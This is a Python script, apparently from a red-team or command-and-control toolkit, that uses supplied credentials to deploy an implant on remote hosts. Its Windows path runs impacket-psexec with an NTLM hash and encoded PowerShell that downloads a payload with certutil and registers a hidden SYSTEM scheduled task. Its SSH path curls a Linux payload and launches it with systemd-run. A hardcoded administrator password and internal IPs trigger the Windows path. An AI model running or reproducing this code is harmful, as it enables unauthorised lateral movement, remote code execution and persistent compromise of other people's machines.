import pwn
import hashlib, binascii
import base64
import paramiko
import os
import random

"""
With valid credentials, psexec and run implant code
"""
def psexec(username, password, target, FLASK_HOST, FLASK_PORT):
    ntlm = binascii.hexlify(hashlib.new('md4', password.encode('utf-16le')).digest()).decode(encoding="utf-8")
    rnum = random.randint(1, 1000)
    cmd = f'certutil.exe -f -split -urlcache http://{FLASK_HOST}:{FLASK_PORT}/static/win.ps1 C:\\programdata\\win.ps1; schtasks /create /tn "agent{rnum}" /tr "powershell -nop -w hidden C:\\Programdata\\win.ps1" /sc onstart /ru system /rl highest /f; schtasks /run /tn "agent{rnum}"'
    b64 = base64.b64encode(cmd.encode("utf-16")[2:]).decode("utf-8")
    os_cmd = f"/usr/bin/impacket-psexec -hashes :{ntlm} {username}@{target} 'powershell -e {b64}'"
    print(os_cmd)
    os.system(os_cmd)

"""
WIth valid credentials, ssh and run implant code
"""
def ssh(username, password, target, FLASK_HOST, FLASK_PORT):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Connect to the server
    try:
        client.connect(target, port=22, username=username, password=password)
        print("Connection successful!")

        rnum = random.randint(1, 1000)

        # Try both commands
        command = f"curl -s http://{FLASK_HOST}:{FLASK_PORT}/static/lin > /tmp/agent{rnum};systemd-run --unit=agent{rnum} bash /tmp/agent{rnum}"
        stdin, stdout, stderr = client.exec_command(command)

        cmd = f'certutil.exe -f -split -urlcache http://{FLASK_HOST}:{FLASK_PORT}/static/win.ps1 C:\\programdata\\win.ps1; schtasks /create /tn "agent{rnum}" /tr "powershell -nop -w hidden C:\\Programdata\\win.ps1" /sc onstart /ru system /rl highest /f; schtasks /run /tn "agent{rnum}"'
        b64 = base64.b64encode(cmd.encode("utf-16")[2:]).decode("utf-8")
        os_cmd = f"powershell -e {b64}"
        stdin, stdout, stderr = client.exec_command(command)

        # Close the connection
        client.close()

    except Exception as e:
        print(f"Error occurred: {e}")

if __name__=="__main__":
    psexec("administrator", "CMpass123!", "10.100.3.54", "172.16.1.5", "5000")
